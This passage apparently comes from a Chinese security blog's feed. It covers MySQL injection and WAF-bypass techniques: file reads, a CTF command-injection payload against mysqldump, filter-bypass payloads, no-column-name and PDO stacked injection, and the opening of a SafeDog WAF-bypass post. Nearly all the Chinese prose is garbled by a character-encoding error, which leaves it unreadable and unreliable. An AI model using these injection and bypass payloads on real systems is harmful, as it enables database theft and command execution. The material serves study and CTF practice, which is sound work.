user(cmd text)</span><br><span class="line">load data infile &#x27;e:/test.txt&#x27; into table user;</span><br><span class="line">select * from user;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523134532606.png" alt="image-20230523134532606"></p><p><img src="/../images/image-20230522220456619.png" alt="image-20230522220456619"></p><h4 id="mysqldump"><a href="#mysqldump" class="headerlink" title="mysqldump"></a>mysqldump</h4><p><strong>shell</strong>ä¸‹æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases &gt; file_path  # å¯¼å‡ºæ‰€æœ‰æ•°æ®åº“</span><br><span class="line">mysqldump -uroot -proot --databases db1 --tables a1 a2  &gt; /file_path # å¯¼å‡ºdb1ä¸­çš„a1ã€a2è¡¨</span><br></pre></td></tr></table></figure><p>å¯¼å‡ºçš„æ–‡æœ¬å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åˆ›å»ºæ•°æ®åº“åˆ¤æ–­è¯­å¥-åˆ é™¤è¡¨-åˆ›å»ºè¡¨-é”è¡¨-ç¦ç”¨ç´¢å¼•-æ’å…¥æ•°æ®-å¯ç”¨ç´¢å¼•-è§£é”è¡¨</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528204837541.png" alt="image-20230528204837541"></p><h5 id="ä¾‹é¢˜-3"><a href="#ä¾‹é¢˜-3" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h5><p>CICSN2023åˆèµ›â€“dumpit</p><p>å…³é”®ä»£ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$black</span> = <span class="string">&#x27;;`*#^$&amp;|&#x27;</span>;  <span class="comment">#é»‘åå•</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;db&#x27;</span>];</span><br><span class="line"><span class="variable">$t2d</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;table_2_dump&#x27;</span>];</span><br><span class="line"><span class="variable">$randstr</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$dump</span>=<span class="string">&#x27;mariadb-dump &#x27;</span>.<span class="variable">$db</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$t2d</span>.<span class="string">&#x27; &gt;./log/&#x27;</span>.<span class="variable">$randstr</span>.<span class="string">&#x27;.log&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$dump</span>);</span><br></pre></td></tr></table></figure><p>dbå’Œtableéƒ½å¯æ§ï¼Œè¿‡æ»¤ä¸ä¸¥è°¨ï¼Œå¹¶ä¸”ç›´æ¥æ‹¼æ¥åˆ°å‘½ä»¤ä¸­ï¼Œé€ æˆRCE</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=flag2 %0d%0a cmd</span><br></pre></td></tr></table></figure><h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>å›½å…‰å¸ˆå‚…âœçš„å¤ªå¥½è¾£ï¼Œç­‰åˆ°åé¢å­¦ä¹ windowsææƒå†å¤ç°å§ğŸ˜‹</p><p><a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><h4 id="Linuxçš„Mysqlâ€“å¥½åƒæ²¡ç”¨"><a href="#Linuxçš„Mysqlâ€“å¥½åƒæ²¡ç”¨" class="headerlink" title="Linuxçš„Mysqlâ€“å¥½åƒæ²¡ç”¨"></a>Linuxçš„Mysqlâ€“å¥½åƒæ²¡ç”¨</h4><p><code>help</code>æŸ¥çœ‹<code>mysql</code>å¸®åŠ©</p><p><img src="/../images/image-20230522205545396.png" alt="image-20230522205545396"></p><p>å‡æƒ³ï¼šå¦‚æœå­˜åœ¨å †å æ³¨å…¥ï¼Œå°±å¯ä»¥ä»¥å½“å‰æ•°æ®åº“ç”¨æˆ·æƒé™ä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/image-20230522205812501.png" alt="image-20230522205812501"></p><p>æµ‹è¯•äº†ä¸€ä¸‹å¥½åƒä¸è¡Œ</p><p><img src="/../images/image-20230522223047561.png" alt="image-20230522223047561"></p><p><strong>å¹¶ä¸”æ­¤æ–¹æ³•åªèƒ½åœ¨æœ¬åœ°è¯»å–ï¼Œè¿œç¨‹è¿æ¥mysqlæ—¶ä½¿ç”¨systemï¼Œå®é™…ä¸Šè¿˜æ˜¯åœ¨åŸæ¥çš„ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ã€‚</strong></p><p><code>kali</code>è¿æ¥è¿œç¨‹mysqlï¼Œ<code>system uname -a</code></p><p><img src="/../images/image-20230522210207967.png" alt="image-20230522210207967"></p><h2 id="Mysqlç»•è¿‡è¡¥å……"><a href="#Mysqlç»•è¿‡è¡¥å……" class="headerlink" title="Mysqlç»•è¿‡è¡¥å……"></a>Mysqlç»•è¿‡è¡¥å……</h2><h3 id="é€šç”¨ç»•è¿‡"><a href="#é€šç”¨ç»•è¿‡" class="headerlink" title="é€šç”¨ç»•è¿‡"></a>é€šç”¨ç»•è¿‡</h3><ul><li><p>å¤§å°å†™ç»•è¿‡</p><p>ä¿®å¤ï¼šæ­£åˆ™<code>/i</code></p></li><li><p>åŒå†™ç»•è¿‡ï¼ˆwafå°†å…³é”®å­—æ›¿æ¢ä¸ºç©ºï¼Œä¸”æ¬¡æ•°ä¸º1ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uniunionon</span><br></pre></td></tr></table></figure><p>ä¿®å¤ï¼šæ­£åˆ™<code>/m</code></p></li></ul><h3 id="æ³¨é‡Šç¬¦ç»•è¿‡"><a href="#æ³¨é‡Šç¬¦ç»•è¿‡" class="headerlink" title="æ³¨é‡Šç¬¦ç»•è¿‡"></a>æ³¨é‡Šç¬¦ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ‰‹åŠ¨é—­åˆ</span><br><span class="line">$sql=&quot;select * from users where id=&#x27;$id&#x27;;&quot;</span><br><span class="line"></span><br><span class="line">$id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line"></span><br><span class="line">select * from users where id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;2&#x27;;</span><br></pre></td></tr></table></figure><h3 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h3><ul><li><p><code>%0a</code></p></li><li><p><code>%0d%0a</code></p></li><li><p><code>/**/</code></p></li><li><p>æ‹¬å·ç»•è¿‡</p><blockquote><p>åœ¨MySQLä¸­ï¼Œæ‹¬å·æ˜¯ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢çš„ã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚è€Œæ‹¬å·çš„ä¸¤ç«¯ï¼Œå¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼ã€‚</p></blockquote><p><img src="/../images/image-20230522161003063.png" alt="image-20230522161003063"></p></li></ul><h3 id="å¼•å·ç»•è¿‡"><a href="#å¼•å·ç»•è¿‡" class="headerlink" title="å¼•å·ç»•è¿‡"></a>å¼•å·ç»•è¿‡</h3><h4 id="ä¸è®©ç”¨å•å¼•å·"><a href="#ä¸è®©ç”¨å•å¼•å·" class="headerlink" title="ä¸è®©ç”¨å•å¼•å·"></a>ä¸è®©ç”¨å•å¼•å·</h4><p>å¯ä»¥ç”¨åå…­è¿›åˆ¶ä»£æ›¿</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">where(table_name=&#x27;users&#x27;) â†’ where(table_name=0x7573657273)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522163358530.png" alt="image-20230522163358530"></p><h4 id="è½¬ä¹‰äº†å•å¼•å·"><a href="#è½¬ä¹‰äº†å•å¼•å·" class="headerlink" title="è½¬ä¹‰äº†å•å¼•å·"></a>è½¬ä¹‰äº†å•å¼•å·</h4><p>å®½å­—èŠ‚æ³¨å…¥ï¼ŒäºŒæ¬¡æ³¨å…¥</p><h3 id="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"><a href="#å­—ç¬¦ä¸²è¿æ¥å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"></a>å­—ç¬¦ä¸²è¿æ¥å‡½æ•°</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)</span><br><span class="line"></span><br><span class="line">concat_ws(&quot;,&quot; , &quot;str1&quot; , &quot;str2&quot;)</span><br><span class="line"></span><br><span class="line">group_concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)</span><br></pre></td></tr></table></figure><h3 id="selectç»•è¿‡"><a href="#selectç»•è¿‡" class="headerlink" title="selectç»•è¿‡"></a>selectç»•è¿‡</h3><ul><li><p>å·²çŸ¥è¡¨åå¯ä»¥ç”¨<code>handle</code></p></li><li><p>ç‰ˆæœ¬&gt;&#x3D;8.0</p><p><a href="https://blog.csdn.net/rfrder/article/details/118726022">mysql 8.0.21ä»¥ä¸Šç‰ˆæœ¬çš„æ–°ç‰¹æ€§</a></p></li><li><p>åœ¨å¯¹å½“å‰è¡¨çš„åˆ—åæ³¨å…¥æ—¶ï¼Œå¯ä»¥ç›´æ¥å†™å­—æ®µåï¼Œè€Œæ— éœ€<code>select è¯¥å­—æ®µ from è¯¥è¡¨</code></p><p><img src="/../images/image-20230522161753632.png" alt="image-20230522161753632"></p></li></ul><h3 id="é€—å·ç»•è¿‡"><a href="#é€—å·ç»•è¿‡" class="headerlink" title="é€—å·ç»•è¿‡"></a>é€—å·ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(databse(),1,1) ç­‰ä»·äº substr(databse() from 1 for 1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3; ç­‰ä»·äº select * from (select 1)a join (select 2)b join (select 3)c;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220718092241142.png" alt="image-20220718092241142"></p><h3 id="å†…è”æ³¨é‡Š"><a href="#å†…è”æ³¨é‡Š" class="headerlink" title="å†…è”æ³¨é‡Š"></a>å†…è”æ³¨é‡Š</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¦‚æœåŠ äº†!å°±ä¼šæ‰§è¡Œåœ¨/* */å†…çš„è¯­å¥</span><br><span class="line">/*!union select 1,2*/</span><br><span class="line"></span><br><span class="line"># è¦å°†æ•´ä¸ªè¯­å¥å†™å…¥/* */å†…</span><br><span class="line">/*!union select */1,2 è¿™æ˜¯é”™è¯¯çš„</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#  version 5.7.26</span><br><span class="line">/*!00000 select 1,2*/; å¯ä»¥</span><br><span class="line">/*!50726 select 1,2*/;  å¯ä»¥</span><br><span class="line">/*!50727 select 1,2*/;  ä¸å¯ä»¥</span><br><span class="line"></span><br><span class="line">00000 åˆ° 50726ä¹‹é—´æ˜¯å¯ä»¥çš„</span><br></pre></td></tr></table></figure><h3 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a>æ— åˆ—åæ³¨å…¥</h3><h4 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h4><p><code>information_schem</code>è¢«è¿‡æ»¤ï¼Œä¸çŸ¥é“è¡¨çš„å­—æ®µå</p><h4 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h4><p>é€šè¿‡<code>select æ•°å­—</code>å°†å­—æ®µåè®¾ç½®ä¸ºæ•°å­—</p><p><img src="/../images/image-20230523141619236.png" alt="image-20230523141619236"></p><p>å†ç”¨è”åˆæŸ¥è¯¢å°†éœ€è¦çš„æ•°æ®å­˜åˆ°ä¸Šå›¾çš„è¡¨ä¸­</p><p><img src="/../images/image-20230523141701416.png" alt="image-20230523141701416"></p><p>é‚£ä¹ˆæƒ³è¦æŸ¥è¯¢<code>users</code>è¡¨ä¸­çš„<code>username</code>å­—æ®µçš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `2` from (select 1,2,3 union select * from user)åˆ«å;</span><br><span class="line"></span><br><span class="line"># åˆ«åæ˜¯(select 1,2 union select * from user)è¿”å›çš„è¡¨çš„åˆ«å</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523141936080.png" alt="image-20230523141936080"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¦‚æœåå¼•å·è¢«è¿‡æ»¤</span><br><span class="line">select group_concat(b) from (select 1,2 as b,3 union select * from users)a;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523142119240.png" alt="image-20230523142119240"></p><h2 id="é¢„ç¼–è¯‘é—®é¢˜"><a href="#é¢„ç¼–è¯‘é—®é¢˜" class="headerlink" title="é¢„ç¼–è¯‘é—®é¢˜"></a>é¢„ç¼–è¯‘é—®é¢˜</h2><p>æ¨èé˜…è¯»ï¼š</p><p><a href="https://forum.butian.net/share/1559">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-SQLæ³¨å…¥&amp;é¢„ç¼–è¯‘</a></p><p><a href="https://xz.aliyun.com/t/3950">PDOåœºæ™¯ä¸‹çš„SQLæ³¨å…¥æ¢ç©¶ - å…ˆçŸ¥ç¤¾åŒº</a></p><h3 id="é¢„ç¼–è¯‘å¤±æ•ˆ"><a href="#é¢„ç¼–è¯‘å¤±æ•ˆ" class="headerlink" title="é¢„ç¼–è¯‘å¤±æ•ˆ"></a>é¢„ç¼–è¯‘å¤±æ•ˆ</h3><p><code>PHP-PDO</code>é‡‡ç”¨æœ¬åœ°é¢„å¤„ç†</p><p><img src="/../images/image-20230330172825283.png" alt="image-20230330172825283"></p><p>ä¼ å…¥<code>?username=&#39;admin&#39;</code>,æŸ¥çœ‹æ—¥å¿—å¦‚ä¸‹</p><blockquote><p>å¼€å¯æ°¸ä¹…æ—¥å¿—,åœ¨é…ç½®æ–‡ä»¶ä¸­åŠ å…¥</p><p>general_log &#x3D; 1<br>general_log_file &#x3D; æ—¥å¿—è·¯å¾„</p></blockquote><p><img src="/../images/image-20230330172741664.png" alt="image-20230330172741664"></p><p>å¯ä»¥çœ‹åˆ°é¢„ç¼–è¯‘ä¸ºå…¶è‡ªåŠ¨æ·»åŠ äº†ä¸€å¯¹å¼•å·ï¼Œå¹¶å°†ç”¨æˆ·è¾“å…¥çš„å¼•å·è¿›è¡Œè½¬ä¹‰ã€‚</p><p>é‚£ä¹ˆå¦‚æœå°†è¡¨åï¼Œ<code>order by xx</code>å¤„è¿›è¡Œé¢„ç¼–è¯‘å°±ä¼šäº§ç”Ÿå¦‚ä¸‹æ•ˆæœ</p><p><img src="/../images/image-20230330001720031.png" alt="image-20230330001720031"></p><p><img src="/../images/image-20230330001733787.png" alt="image-20230330001733787"></p><p>å¯ä»¥çœ‹åˆ°è¿™äº›è¯­å¥â€å¤±æ•ˆäº†â€ï¼ˆæ²¡æœ‰å¾—åˆ°æƒ³è¦çš„ç»“æœï¼‰ï¼Œæ‰€ä»¥åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¯¹äºè¿™äº›è¯­å¥å¤§æ¦‚ç‡å°±æ˜¯è¿›è¡Œä¸€ä¸ªæ‹¼æ¥å¤„ç†ï¼Œå°±å¾ˆå¯èƒ½å­˜åœ¨sqlæ³¨å…¥ã€‚</p><h3 id="é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯"><a href="#é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯" class="headerlink" title="é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯"></a>é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯</h3><ul><li><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">ThinkPHP5 SQLæ³¨å…¥æ¼æ´ &amp;&amp; PDOçœŸ&#x2F;ä¼ªé¢„å¤„ç†åˆ†æ | ç¦»åˆ«æ­Œ</a></p></li><li><p>å †å æ³¨å…¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment"># é¢„å¤„ç†è¯­å¥</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select * from users where id=<span class="subst">$id</span>&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$fraction</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$fraction</span>);</span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨æ¨¡æ‹Ÿé¢„ç¼–è¯‘</li></ul></li><li><p>æ²¡æœ‰ç»‘å®šå‚æ•°</p><p>åˆå› ä¸ºPDOé»˜è®¤å¯ä»¥æ”¯æŒå¤šæ¡SQLæ‰§è¡Œï¼Œæ‰€æœ‰é€ æˆäº†å †å æ³¨å…¥ã€‚</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1;create database pdo;</span><br></pre></td></tr></table></figure><p>  <img src="/../images/image-20230523131701820.png" alt="image-20230523131701820"></p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>From Oceansecå¸ˆå‚…</p><p>sqlmap æºç åˆ†æ</p><ul><li><p><a href="https://www.anquanke.com/post/id/262848">sqlmap é¡¹ç›®å‰–æ1</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262847">sqlmap é¡¹ç›®å‰–æ2</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262849">sqlmap é¡¹ç›®å‰–æ3</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262850">sqlmap é¡¹ç›®å‰–æ4</a></p></li><li><p><a href="https://www.beysec.com/security/sqlmap-source-1.html">sqlmapæºç åˆ†æä¸å­¦ä¹ </a></p></li><li><p><a href="https://www.processon.com/view/5835511ce4b0620292bd7285">sqlmap æµç¨‹è„‘å›¾</a></p></li></ul><p>os-shell åŸç†</p><ul><li><a href="https://xz.aliyun.com/t/7942">sqlmap â€“os-shellåŸç†</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&mid=2247485339&idx=1&sn=ea76ee0d56b8a95a118a60d111d48160">Sqlmapä¹‹os-shellåŸç†åˆ†æ</a></li></ul><p>æ”»é˜²</p><ul><li><a href="https://xz.aliyun.com/t/10385">å®æˆ˜sqlmapç»•è¿‡WAF</a></li><li><a href="https://www.anquanke.com/post/id/261915">sqlmap â€“os-shellååˆ¶å°æ€è·¯</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247494179&idx=1&sn=e6c94b87981fda009e7be50c9eb73bf6">å…¥ä¾µæ£€æµ‹ä¹‹sqlmapæ¶æ„æµé‡åˆ†æ</a></li></ul><h2 id="é˜²å¾¡æ–¹æ³•"><a href="#é˜²å¾¡æ–¹æ³•" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a>é˜²å¾¡æ–¹æ³•</h2><ul><li><p>æ­£ç¡®ä½¿ç”¨é¢„ç¼–è¯‘+é»‘åå•</p></li><li><p>é…ç½®é—®é¢˜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  ç«™åº“åˆ†ç¦»</span><br><span class="line">  ä¸å…è®¸å¤–è¿</span><br><span class="line">  æ•°æ®åº“ä»¥ä½æƒé™è¿è¡Œ</span><br><span class="line">  ä¸æ˜¾ç¤ºæŠ¥é”™</span><br><span class="line">  ä¸ä½¿ç”¨å¤šè¯­å¥æŸ¥è¯¢</span><br><span class="line">  secure_file_priv=NULL</span><br><span class="line">å­—ç¬¦é›†ä¿æŒä¸€è‡´</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Webæ¼æ´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wafç»•è¿‡ç®€å•å­¦ä¹ </title>
      <link href="/2023/05/31/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/05/31/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="çŸ¥å·±çŸ¥å½¼"><a href="#çŸ¥å·±çŸ¥å½¼" class="headerlink" title="çŸ¥å·±çŸ¥å½¼"></a>çŸ¥å·±çŸ¥å½¼</h2><p><strong>å…ˆé˜…è¯»</strong><a href="https://www.cnblogs.com/realjimmy/p/12937247.html">WAFåŠŸèƒ½ä»‹ç»ï¼ˆå…¥é—¨æ‰«ç›²ç¯‡ï¼‰ - ä¸€è§‰é†’æ¥å†™ç¨‹åº - åšå®¢å›­</a></p><ul><li>éƒ¨ç½²æ–¹å¼</li><li>å¼•æ“è§„åˆ™åŸç†</li></ul><h3 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h3><p><img src="/../images/image-20230516142728508.png" alt="image-20230516142728508"></p><p>æœ¬æ–‡ä»¥å®‰å…¨ç‹—ä¸ºä¾‹å­è¿›è¡Œç®€å•å­¦ä¹ </p><h3 id="éƒ¨ç½²ä½ç½®"><a href="#éƒ¨ç½²ä½ç½®" class="headerlink" title="éƒ¨ç½²ä½ç½®"></a>éƒ¨ç½²ä½ç½®</h3><p><img src="/../images/2015081104292360563.png" alt="enter image description here"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·æ±‚ â†’ CDN â†’ äº‘waf â†’ ç¡¬waf â†’ WEBæœåŠ¡å™¨ â†’ è½¯waf â†’ WEBåº”ç”¨ç¨‹åºï¼ˆä»£ç wafï¼‰ â†’ (æ•°æ®åº“)</span><br></pre></td></tr></table></figure><h2 id="å‚¨å¤‡çŸ¥è¯†"><a href="#å‚¨å¤‡çŸ¥è¯†" class="headerlink" title="å‚¨å¤‡çŸ¥è¯†"></a>å‚¨å¤‡çŸ¥è¯†</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wafäº†è§£</span><br><span class="line">å„ç§è¯­æ³•</span><br><span class="line">httpåè®®</span><br><span class="line">webæœåŠ¡å™¨ç‰¹æ€§</span><br></pre></td></tr></table></figure><h2 id="WAFç»•è¿‡"><a href="#WAFç»•è¿‡" class="headerlink" title="WAFç»•è¿‡"></a>WAFç»•è¿‡</h2><h3 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h3><p>æ²¡æœ‰åœ¨ä»£ç ä¸­è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚æœ‰ä¼šè¯´æ˜ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win  10</span><br><span class="line">php  5.6.9</span><br><span class="line">mysql 5.7.26</span><br><span class="line">apache 2.4.39</span><br><span class="line">safe dog V3.5 </span><br></pre></td></tr></table></figure><p>é…ç½®å¦‚ä¸‹</p><p><img src="/../images/image-20230516235356524.png" alt="image-20230516235356524"></p><p><img src="/../images/image-20230516150636839.png" alt="image-20230516150636839"></p><p>ç‰¹å¾</p><p><img src="/../images/image-20230517003655268.png" alt="image-20230517003655268"></p><p><img src="/../images/image-20230517100649383.png" alt="image-20230517100649383"></p><h3 id="è¿‚å›ä½œæˆ˜"><a href="#è¿‚å›ä½œæˆ˜" class="headerlink" title="è¿‚å›ä½œæˆ˜"></a>è¿‚å›ä½œæˆ˜</h3><blockquote><p>ä¸»æ‰“ä¸€ä¸ªä¾§é¢ç»•è¿‡ï¼Œåˆ©ç”¨å„ç§ç¼ºé™·å’Œç‰¹æ€§ä½¿å¾—<strong>wafæ²¡æœ‰è§£æåˆ°payload</strong>ï¼Œä¸ä¸wafçš„è§„åˆ™å’Œç­–ç•¥ç¡¬åˆš</p></blockquote><h4 id="WebæœåŠ¡å™¨ç‰¹æ€§"><a href="#WebæœåŠ¡å™¨ç‰¹æ€§" class="headerlink" title="WebæœåŠ¡å™¨ç‰¹æ€§"></a>WebæœåŠ¡å™¨ç‰¹æ€§</h4><blockquote><p>WebæœåŠ¡å™¨è§£æä¸wafè§£æä¸åŒç»•è¿‡</p></blockquote><h5 id="IIS-ASP"><a href="#IIS-ASP" class="headerlink" title="IIS+ASP"></a>IIS+ASP</h5><ul><li><p><code>%</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯¹äºURLè¯·æ±‚çš„å‚æ•°å€¼ä¸­çš„%ï¼Œå¦‚æœå’Œåé¢çš„å­—ç¬¦æ„æˆçš„å­—ç¬¦ä¸²åœ¨URLç¼–ç è¡¨ä¹‹å¤–ï¼ŒASPè„šæœ¬å¤„ç†æ—¶ä¼šå°†å…¶å¿½ç•¥ã€‚</span><br><span class="line"></span><br><span class="line">select  â†’  se%lect</span><br></pre></td></tr></table></figure></li><li><p><code>unicode</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IISä¼šè‡ªåŠ¨è§£ç unicode</span><br></pre></td></tr></table></figure></li></ul><h5 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/path1/path2/ == ;/path1;foo/path2;bar/;</span><br></pre></td></tr></table></figure><h5 id="å‚æ•°æ±¡æŸ“"><a href="#å‚æ•°æ±¡æŸ“" class="headerlink" title="å‚æ•°æ±¡æŸ“"></a>å‚æ•°æ±¡æŸ“</h5><p>ä¼ é€’å¤šä¸ªç›¸åŒå‚æ•°ï¼Œåˆ©ç”¨wafå’ŒwebæœåŠ¡å™¨è§£æçš„å‚æ•°ä¸åŒæ¥è¿›è¡Œç»•è¿‡</p><table><thead><tr><th align="left">Web ç¯å¢ƒ</th><th align="left">å‚æ•°è·å–å‡½æ•°</th><th align="left">è·å–åˆ°çš„å‚æ•°</th></tr></thead><tbody><tr><td align="left">PHP&#x2F;Apache</td><td align="left">$_GET(â€œparâ€)</td><td align="left">last</td></tr><tr><td align="left">JSP&#x2F;Tomcat</td><td align="left">Request.getParameter(â€œparâ€)</td><td align="left">first</td></tr><tr><td align="left">Perl(CGI)&#x2F;Apache</td><td align="left">Param(â€œparâ€)</td><td align="left">first</td></tr><tr><td align="left">Python&#x2F;Apache</td><td align="left">getvalue(â€œparâ€)</td><td align="left">[â€œfirstâ€,â€lastâ€]</td></tr><tr><td align="left">ASP.NET&#x2F;IIS</td><td align="left">Request.QueryString(â€œparâ€)</td><td align="left">first,last</td></tr></tbody></table><h4 id="Webåº”ç”¨ç¨‹åºå±‚"><a href="#Webåº”ç”¨ç¨‹åºå±‚" class="headerlink" title="Webåº”ç”¨ç¨‹åºå±‚"></a>Webåº”ç”¨ç¨‹åºå±‚</h4><blockquote><p>Webåº”ç”¨ç¨‹åºå±‚ï¼ˆåç«¯ä»£ç ï¼‰è§£æä¸wafè§£æä¸åŒ</p><p><strong>wafæ²¡æœ‰æ ¹æ®åç«¯ä»£ç æ¥ä¿®æ”¹ç­–ç•¥å’Œè§„åˆ™</strong></p></blockquote><h5 id="ç¼–ç "><a href="#ç¼–ç " class="headerlink" title="ç¼–ç "></a>ç¼–ç </h5><p>å¯¹è¯·æ±‚æ•°æ®è¿›è¡Œç¼–ç ï¼Œä¾‹å¦‚urlç¼–ç ï¼ŒUnicodeç¼–ç ç­‰ï¼Œå¦‚æœwafå¯¹æ•°æ®ä¸èƒ½æœ‰æ•ˆçš„è§£ç ï¼Œè€Œåº”ç”¨åç«¯èƒ½å¤Ÿæ­£å¸¸è§£ç ï¼Œå°±å¯ä»¥ç»•è¿‡wafã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jsonæ•°æ®æ”¯æŒunicodeç¼–ç </span><br></pre></td></tr></table></figure><h5 id="å¤šæ•°æ®æ¥æº"><a href="#å¤šæ•°æ®æ¥æº" class="headerlink" title="å¤šæ•°æ®æ¥æº"></a>å¤šæ•°æ®æ¥æº</h5><p>webåº”ç”¨ç¨‹åºä»å¤šä¸ªåœ°æ–¹å–å€¼ï¼Œå¦‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_SERVER</span>[<span 